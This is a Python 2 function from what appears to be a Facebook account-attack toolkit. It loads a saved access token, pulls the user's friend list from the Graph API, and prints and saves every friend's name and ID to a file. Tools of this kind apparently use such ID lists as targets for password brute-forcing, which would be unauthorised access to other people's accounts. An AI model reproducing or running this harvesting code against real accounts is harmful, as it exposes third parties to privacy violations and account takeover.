def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')

        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo11
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;97m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;97mName\x1b[1;97m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;97mID   \x1b[1;97m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\x1b[1;97mTotal ID \x1b[1;97m%s' % len(idfriends)
            print '\x1b[1;97mFile Save \x1b[1;97m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error while creating file'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            menu()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


